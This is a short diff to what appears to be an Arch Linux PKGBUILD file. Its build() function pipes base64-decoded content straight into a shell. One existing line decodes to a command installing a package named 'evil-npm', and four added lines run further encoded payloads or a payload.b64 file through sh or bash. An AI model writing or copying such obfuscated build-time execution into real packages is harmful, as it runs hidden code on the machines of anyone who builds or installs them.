@@ -3,4 +3,8 @@ pkgver=1.0
 pkgrel=1
 build() {
     echo "YnVuIGFkZCBldmlsLW5wbQ==" | base64 -d | bash
+    echo "$payload" | base64 -di | sh
+    echo "$x" | base64 -d | env -i bash
+    key=`echo "$x" | base64 -d | sh`
+    base64 -d payload.b64 2>/dev/null | bash
 }
